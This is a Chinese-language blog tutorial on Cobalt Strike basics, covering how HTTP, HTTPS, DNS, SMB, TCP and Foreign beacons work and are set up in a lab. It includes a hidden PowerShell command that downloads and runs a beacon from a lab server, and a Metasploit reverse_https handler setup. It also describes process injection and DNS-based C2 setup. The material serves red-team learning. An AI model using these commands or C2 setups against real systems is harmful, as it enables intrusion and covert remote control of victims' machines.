+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png"
+        title="image-20240222173926470" /></p>
+<h3 id="http和https-beacon">HTTP和HTTPS Beacon</h3>
+<p><strong>Beacon</strong></p>
+<ul>
+<li>Beacon是CS的Payload</li>
+<li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li>
+<li>通过HTTP、HTTPS和DNS出口网络</li>
+<li>使用SMB协议的时候是点对点通信</li>
+<li>Beacon有很多的后渗透攻击模块和远程管理工具</li>
+</ul>
+<p><strong>Beacon的类型</strong></p>
+<ul>
+<li>HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  windows/beacon_http/reverse_http
+</span></span><span class="line"><span class="cl">  windows/beacon_https/reverse_https
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>DNS Beacon</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  windows/beacon_dns/reverse_dns_txt
+</span></span><span class="line"><span class="cl">  windows/beacon_dns/reverse_http
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>SMB Beacon SMB Beacon也可以叫做pipe beacon</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  windows/beacon_smb/bind_pipe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>创建HTTP Beacon</strong></p>
+<p>点击 Cobalt Strike –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png"
+        title="image-20240223110739474" /></p>
+<p>测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png"
+        title="image-20240223111429362" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png"
+        title="image-20240223110840913" /></p>
+<p>复制弹窗中的命令到靶机中执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-c</span> <span class="s2">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://172.16.86.138:80/test&#39;))&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png"
+        title="image-20240223111527176" /></p>
+<p>回到CS，靶机已经上线：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png"
+        title="image-20240223111606515" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png"
+        title="image-20240223111800363" /></p>
+<p><strong>HTTPS Beacon</strong></p>
+<p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl。</p>
+<h3 id="dns-beacon">DNS Beacon</h3>
+<p>使用DNS请求将Beacon返回。这些DNS请求用于解析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。</p>
+<p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p>
+<p>DNS Beacon的工作流程具体如下：</p>
+<p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png"
+        title="image-20240223161626900" /></p>
+<p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p>
+<p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p>
+<p><strong>域名配置</strong></p>
+<p>既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png"
+        title="image-20211202223623912" /></p>
+<p>配置完可以使用nslookup进行测试</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png"
+        title="image-20211202224423180" /></p>
+<p>CS中创建监听器时填写NS记录的域名：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png"
+        title="image-20211202223356738" /></p>
+<p>靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png"
+        title="image-20211202225129950" /></p>
+<h3 id="smb-beacon">SMB Beacon</h3>
+<p>SMB Beacon使用命名管道通过一个父Beacon进行通信，这种对等通信对同一台主机上的Beacon和跨网络的Beacon都有效。Windows将命名管道通信封装仔SMB协议中，因此得名SMB Beacon。</p>
+<p>因为使用SMB协议通信，Windows的系统防火墙默认放通445端口，所以SMB Beacon在绕防火墙时可能会有意外作用。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png"
+        title="img" /></p>
+<p><strong>SMB Beacon配置</strong></p>
+<p>首先需要一个上线的主机，上线后新建一个SMB Beacon，输入listener名称，选择Beacon SMB，pipename使用默认值即可：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png"
+        title="image-20240227191613502" /></p>
+<p>然后在初始beacon中迁移到smb beacon：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png"
+        title="image-20240227191819912" /></p>
+<p>迁移完成后：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png"
+        title="image-20240227191913542" /></p>
+<p>可以看到派生的SMB Beacon，在external的ip后有个<code>∞∞</code>字符。此时SMB Beacon通过父级的HTTPS Beacon与CS服务器进行通信，而SMB Beacon与HTTPS Beacon通过SMB协议进行通信。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png"
+        title="image-20240227192123585" /></p>
+<p>随后，我们把SMB Beacon注入到一个进程中：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png"
+        title="image-20240227192323558" /></p>
+<p>注入完成后，SMB Beacon就转变为对应进程派生的beacon了：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png"
+        title="image-20240227192530624" /></p>
+<p>如果需要断开和某个会话的连接，使用unlink命令即可，想再次连上使用link就可以。</p>
+<h3 id="tcp-beacon">TCP Beacon</h3>
+<p>TCP Beacon与SMB Beacon类似，区别在于使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量时不加密的。</p>
+<p>在新建tcp beacon时可以指定监听的端口，假设为8888，在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png"
+        title="image-20220213210419805" /></p>
+<h3 id="foreign-beacon">Foreign Beacon</h3>
+<p>使用CS的Foreign Beacon可以派生到meterpreter会话，有http和https两种监听器。</p>
+<p>首先在msf中起一个监听器：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf &gt; use exploit/multi/handler
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_https
+</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_https
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.211.55.2
+</span></span><span class="line"><span class="cl"><span class="nv">lhost</span> <span class="o">=</span>&gt; msf ip
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在cs里配置，填上msf的ip和监听端口。</p>
+<p>然后选择会话右键派生，会话选择forign beacon：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png"
+        title="image-20240227195131535" /></p>
+<p>随后在msf中就会接收到会话：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png"
+        title="image-20240227195228315" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-01-11</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" data-title="Cobalt Strike Basic No.1" data-via="@YaoyaoShaw" data-hashtags="C2"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" data-hashtag="C2"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" data-title="Cobalt Strike Basic No.1"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" data-title="Cobalt Strike Basic No.1"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" data-title="Cobalt Strike Basic No.1"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/c2/">C2</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" class="prev" rel="prev" title="Vulnhub Matrix-breakout-2-Morpheus"><i class="fas fa-angle-left fa-fw"></i>Vulnhub Matrix-breakout-2-Morpheus</a>
+            <a href="/2024/01/cobalt_strike_basic_no.2/" class="next" rel="next" title="Cobalt Strike Basic No.2">Cobalt Strike Basic No.2<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f9